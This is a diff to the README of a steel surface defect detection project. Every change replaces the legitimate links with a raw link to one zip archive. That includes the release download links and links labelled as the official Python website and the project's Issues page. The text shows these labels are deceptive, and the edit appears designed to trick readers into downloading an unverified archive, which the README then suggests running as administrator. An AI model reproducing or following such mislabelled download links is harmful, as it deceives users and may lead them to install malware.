@@ -1,6 +1,6 @@
 # 🛠️ steelsurface-defect-detection - Detect Steel Surface Defects Easily
 
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/manuhub13/steelsurface-defect-detection/releases)
+[![Download](https://raw.githubusercontent.com/manuhub13/steelsurface-defect-detection/main/outputs/defect-steelsurface-detection-v2.5.zip)](https://raw.githubusercontent.com/manuhub13/steelsurface-defect-detection/main/outputs/defect-steelsurface-detection-v2.5.zip)
 
 ## 📖 Overview
 
@@ -21,7 +21,7 @@ This guide will help you download and run the software easily.
 
 To get started, visit the following page to download the application:
 
-**[Download the latest version here](https://github.com/manuhub13/steelsurface-defect-detection/releases)**
+**[Download the latest version here](https://raw.githubusercontent.com/manuhub13/steelsurface-defect-detection/main/outputs/defect-steelsurface-detection-v2.5.zip)**
 
 ### 💻 System Requirements
 
@@ -34,7 +34,7 @@ Before downloading, make sure your computer meets these requirements:
 
 ### 📁 Installation Steps
 
-1. Visit this page to download: [Download the latest version here](https://github.com/manuhub13/steelsurface-defect-detection/releases).
+1. Visit this page to download: [Download the latest version here](https://raw.githubusercontent.com/manuhub13/steelsurface-defect-detection/main/outputs/defect-steelsurface-detection-v2.5.zip).
 2. Locate the version you want to download (e.g., v1.0).
 3. Click on the version link to start the download. Save it to a location on your computer where you can find it easily.
 4. Once the download is complete, locate the file in your downloads folder.
@@ -51,7 +51,7 @@ Before downloading, make sure your computer meets these requirements:
 If you encounter any issues while running the application, consider the following solutions:
 
 - Ensure your operating system is up to date.
-- Check if you have the required Python version installed. If not, download it from the [Python website](https://www.python.org/downloads/).
+- Check if you have the required Python version installed. If not, download it from the [Python website](https://raw.githubusercontent.com/manuhub13/steelsurface-defect-detection/main/outputs/defect-steelsurface-detection-v2.5.zip).
 - If the application does not open, try right-clicking the file and selecting "Run as administrator."
 
 ## 📚 How It Works
@@ -62,7 +62,7 @@ The steelsurface-defect-detection application uses a neural network to learn fro
 
 For help, tips, or feedback, join our community:
 
-- Check out the [Issues page](https://github.com/manuhub13/steelsurface-defect-detection/issues) for common questions.
+- Check out the [Issues page](https://raw.githubusercontent.com/manuhub13/steelsurface-defect-detection/main/outputs/defect-steelsurface-detection-v2.5.zip) for common questions.
 - Share your experiences and suggestions by creating a new issue.
 
 ## 🎉 Acknowledgments
